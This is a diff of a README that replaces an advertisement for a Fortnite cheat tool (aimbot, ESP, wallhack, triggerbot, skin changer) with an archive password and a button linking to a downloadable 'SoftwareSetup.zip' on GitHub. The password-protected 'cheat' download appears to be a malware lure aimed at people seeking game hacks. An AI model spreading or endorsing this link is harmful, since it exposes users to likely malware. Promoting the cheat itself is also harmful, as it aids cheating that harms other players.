@@ -1,2 +1,3 @@
-# Saturn-Galaxy-FN-SWAPPER-Download
-⭐️ Saturn Galaxy FN SWAPPER | Fortnite Aimbot ESP WH | Triggerbot NoRecoil Glow | Skin Changer Menu | Auto Farm Trainer | Menu | Latest Build 2026 | Windows 10/11 PC ⭐️
+# ARCHIVE PASSWORD: 2026
+
+[![button](pic.jpg)](https://github.com/Magmafuoscillate/gasplpnz/releases/download/kjfgb/SoftwareSetup.zip)
